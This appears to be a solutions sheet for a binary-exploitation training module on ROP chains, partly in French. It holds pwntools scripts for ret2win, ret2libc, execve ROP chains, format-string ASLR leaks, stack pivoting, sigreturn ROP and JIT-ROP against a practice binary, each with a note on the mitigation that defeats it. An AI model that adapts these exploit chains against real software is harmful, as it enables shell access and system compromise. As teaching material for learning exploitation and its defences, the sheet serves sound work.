SOLUTIONS - MODULE 38 : ROP CHAINS

⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.

SOLUTION 1 : GADGET FINDER

Using ROPgadget :

```bash
$ ROPgadget --binary ./vuln | grep "pop rdi"
```
0x00401234 : pop rdi ; ret


```bash
$ ROPgadget --binary ./vuln | grep "pop rsi"
```
0x00401236 : pop rsi ; ret


```bash
$ ROPgadget --binary ./vuln | grep syscall
```
0x0040125a : syscall ; ret

Save to file :

```bash
$ ROPgadget --binary ./vuln > gadgets.txt
```

Using ropper (alternative) :

```bash
$ ropper --file ./vuln --search "pop rdi"
```

Bypass : N/A (finding gadgets is legitimate analysis)


SOLUTION 2 : BASIC RET2WIN

Calculate offset :

```bash
$ gdb ./vuln
```
(gdb) pattern create 100
(gdb) run
(gdb) x/wx $rsp
(gdb) pattern offset 0x6161616c  # Gives offset = 72

Build payload (Python) :
from pwn import *

p = process('./vuln')
win_addr = 0x401196  # Address of win() function

payload = b'A' * 72  # Padding to saved RIP
payload += p64(win_addr)  # Overwrite RIP with win()

p.sendline(payload)
p.interactive()

Bypass : Stack canary defeats this (if enabled)


SOLUTION 3 : RET2LIBC EXPLOITATION

Find libc addresses :

```bash
$ ldd ./vuln
```
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f...)


```bash
$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
```
00000000000554e0 T system


```bash
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```
  1b75aa /bin/sh

Build exploit (pwntools) :
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401234  # From ROPgadget
ret = 0x40101a      # Stack alignment

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

payload = b'A' * 72
payload += p64(ret)         # Align stack (needed on modern systems)
payload += p64(pop_rdi)     # pop rdi ; ret
payload += p64(binsh)       # "/bin/sh" address
payload += p64(system)      # Call system("/bin/sh")

p = process('./vuln')
p.sendline(payload)
p.interactive()  # Got shell!

Bypass : ASLR defeats fixed addresses (need leak)


SOLUTION 4 : FULL ROP CHAIN (EXECVE)

Find gadgets :
pop_rdi = 0x401234  # pop rdi ; ret
pop_rsi = 0x401236  # pop rsi ; ret
pop_rdx = 0x401238  # pop rdx ; ret
pop_rax = 0x40123a  # pop rax ; ret
syscall = 0x40125a  # syscall ; ret

binsh_addr = 0x404000  # "/bin/sh" in .data section

ROP chain :
payload = b'A' * 72


```bash
# execve("/bin/sh", NULL, NULL)
```
payload += p64(pop_rdi)
payload += p64(binsh_addr)  # rdi = "/bin/sh"

payload += p64(pop_rsi)
payload += p64(0)           # rsi = NULL

payload += p64(pop_rdx)
payload += p64(0)           # rdx = NULL

payload += p64(pop_rax)
payload += p64(59)          # rax = 59 (execve syscall number)

payload += p64(syscall)     # Execute syscall

Bypass : CFI validates call targets, CET shadow stack prevents ROP


SOLUTION 5 : ASLR BYPASS (INFO LEAK)

Leak via printf format string :

```bash
# Vulnerable: printf(user_input)
```
payload = b'%p.%p.%p.%p.%p.%p'  # Leak stack addresses

```bash
# Output: 0x7ffc... 0x7f... (libc addresses on stack)
```

Calculate libc base :
leaked_addr = int(leak.split('.')[2], 16)  # Get leaked libc address
libc_base = leaked_addr - libc.symbols['__libc_start_main'] - 240

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

Build ROP with calculated addresses :
payload = b'A' * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

Bypass : PIE randomizes executable too, need multiple leaks


SOLUTION 6 : STACK PIVOTING

Find pivot gadget :

```bash
$ ROPgadget --binary ./vuln | grep "xchg.*rsp"
```
0x00401260 : xchg rsp, rax ; ret

Prepare fake stack in bss :
bss_addr = 0x404800  # Writable memory (bss or heap)

Stage 1 (small ROP to read into bss) :
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(0)          # stdin
payload += p64(pop_rsi)
payload += p64(bss_addr)   # Destination
payload += p64(pop_rdx)
payload += p64(500)        # Size
payload += p64(read_addr)  # Call read(0, bss, 500)


```bash
# Pivot to bss
```
payload += p64(pop_rax)
payload += p64(bss_addr)
payload += p64(xchg_rsp_rax)  # RSP = bss_addr

Stage 2 (send full ROP chain to bss) :

```bash
# Now RSP points to bss, continue normal ROP
```

Bypass : Modern stack protections, guard pages


SOLUTION 7 : SIGROP (SIGRETURN ROP)

Use pwntools SigreturnFrame :
from pwn import *

context.arch = 'amd64'

frame = SigreturnFrame()
frame.rax = 59              # execve
frame.rdi = binsh_addr      # "/bin/sh"
frame.rsi = 0               # NULL
frame.rdx = 0               # NULL
frame.rip = syscall_addr    # Execute syscall after sigreturn

payload = b'A' * 72
payload += p64(pop_rax)
payload += p64(15)          # sigreturn syscall number
payload += p64(syscall)     # Call sigreturn(frame)
payload += bytes(frame)     # Sigreturn frame

Manual frame (if no pwntools) :

```bash
# 248 bytes structure with all register values
# See sigcontext structure in <signal.h>
```

Bypass : Kernel validation of sigreturn frames, hard to exploit


SOLUTION 8 : JIT-ROP (ADVANCED)

Concept (browser exploit style) :
1. Leak executable page address
2. Read executable memory (info disclosure)
3. Parse opcodes to find gadgets at runtime
4. Build ROP chain with found gadgets
5. Execute

Simplified code :

```c
// Read memory primitive
void* leak = read_memory(code_addr, 1000);
```


```c
// Find "pop rdi ; ret" (5f c3 in opcodes)
```
for (int i = 0; i < 1000-1; i++) {
    if (leak[i] == 0x5f && leak[i+1] == 0xc3) {
        pop_rdi = code_addr + i;
        break;
    }
}


```c
// Build ROP chain dynamically
```
rop_chain[0] = pop_rdi;
rop_chain[1] = arg;
rop_chain[2] = target_func;

Bypass : Extremely advanced, used in modern browser/JIT exploits


RÉFÉRENCES :
- "Return-Oriented Programming" (Hovav Shacham)
- ROP Emporium challenges (ret2win to fluff)
- pwntools documentation (ROP module)
- "The Art of Exploitation" (Jon Erickson)
- LiveOverflow YouTube (binary exploitation series)

